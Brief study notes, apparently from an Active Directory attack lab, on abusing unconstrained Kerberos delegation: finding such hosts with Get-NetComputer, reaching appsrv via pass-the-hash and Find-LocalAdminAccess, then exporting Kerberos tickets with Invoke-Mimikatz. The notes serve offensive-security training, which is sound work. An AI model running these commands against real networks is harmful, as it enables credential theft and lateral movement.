Get-NetComputer -UnConstrained

-Compromise the server(s) where Unconstrained delgation is enabled.

--run as the user with admin privileges on one of the computer found in get-netcomputer -unconstrained (appsrv - PTH as appadmin)

---Find-LocalAdminAccess (it'll find to appsrv which is a computer with unconstrained delegation enabled)

---Enter the appsrv session (unconstrained delegation enabled computer)

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
